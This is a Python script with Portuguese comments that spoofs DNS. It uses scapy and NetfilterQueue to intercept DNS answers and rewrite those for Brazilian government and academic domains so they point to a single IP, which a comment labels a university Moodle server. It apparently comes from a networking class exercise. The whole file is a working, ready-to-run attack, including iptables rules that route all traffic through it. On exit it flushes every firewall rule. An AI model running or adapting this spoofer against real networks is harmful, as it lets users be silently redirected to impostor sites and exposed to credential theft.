import os
from scapy.all import *
from netfilterqueue import NetfilterQueue

# PARA ONDE SERA REDIRECIONADO
destino = "200.18.45.29" # MOODLE UFSM

# DE ONDE SERAO REDIRECIONADOS
alvos = {
    b"www.portaltransparencia.gov.br.",
    b"lattes.cnpq.br.",
    b"prouniportal.mec.gov.br.",
    b"www8.receita.fazenda.gov.br.",
    b"www.pop-ap.rnp.br."
}

# VERIFICAR SE O PACOTE EH DNS
def pacote_dns(pacote):
    if(pacote.haslayer(DNSRR)):
        return True
    return False

# VERIFICA SE EH ALGUM ALVO
def verifica_alvo(url):
    if(url in alvos):
        os.system("clear")
        # PRINT DO ALVO ENCONTRADO
        print("Alvo ", url ," encontrado. Hora do show!")
        return True
    return False

# MODIFICACAO DO PACOTE
def modifica_pacote(pacote):

    # CAPTURA DA URL ORIGEM
    origem = pacote[DNSQR].qname

    # VERIFICA SE EH UM DOS ALVOS SELECIONADOS
    if(verifica_alvo(origem)):

        # ALTERA DADOS PARA REDIRECIONAR
            # ALTERNADO A RESPOSTA COM O DESTINO QUE QUEREMOS
        pacote[DNS].an = DNSRR(rrname = origem, rdata = destino)
            # QUANTIA DE RESPOSTAS
        pacote[DNS].ancount = 1
            # REMOVENDO INFORMACOES PARA GERAR NOVAS
            # (INFORMACOES PERMITEM VERIFICAR SE O PACOTE FOI ALTERADO)
        del pacote[IP].len
        del pacote[IP].chksum
        del pacote[UDP].len
        del pacote[UDP].chksum

        # 
        print("Redirecionando...")

    return pacote

# FUNCAO QUE GERENCIA O PACOTE
def manipulacao_pacote(pacote):
    pacote_scapy = IP(pacote.get_payload())
    
    # VERIFICACAO SE PACOTE DNS E MODIFICACAO
    if(pacote_dns(pacote_scapy)):
        
        # MODIFICANDO PACOTE
        pacote_scapy_alterado = modifica_pacote(pacote_scapy)

        # SETANDO ESPACO PARA O PACOTE ALTERADO QUE SERA ENVIADO
        pacote.set_payload(bytes(pacote_scapy))

        
    # ENVIAR PACOTE (APÓS ALTERAR OU NÃO)
    pacote.accept()


# ---------- Main ---------- #

# REGRAS PARA QUE TODOS OS PACOTES PASSEM PELO PROGRAMA
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")

# FILA DOS PACOTES
fila_pacotes = NetfilterQueue()

# FILA DE PACOTES QUE CHEGAM
try:
    fila_pacotes.bind(0, manipulacao_pacote)
    fila_pacotes.run()

# AO SAIR DO PROGRAMA REMOVER REGRAS CRIADAS NO IPTABLES
except KeyboardInterrupt:
    os.system("iptables --flush")
